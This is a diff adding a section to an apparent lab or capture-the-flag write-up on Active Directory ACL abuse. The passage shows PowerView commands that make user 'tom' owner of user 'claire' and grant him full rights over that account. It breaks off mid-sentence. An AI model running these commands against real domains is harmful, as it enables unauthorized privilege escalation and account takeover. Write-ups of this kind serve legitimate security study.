@@ -483,7 +483,14 @@ cat acls.csv | grep tom
 ```
 So it looks like the most interesting part from this output is that `tom` has `writeowner` over `claire`
 
+# Granting full control over `claire` as `tom`
 
+```python
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1                                                      
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity 'claire' -OwnerIdentity 'tom'
+PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "claire" -PrincipalIdentity "tom"
+```
+This imported power
 
 
 
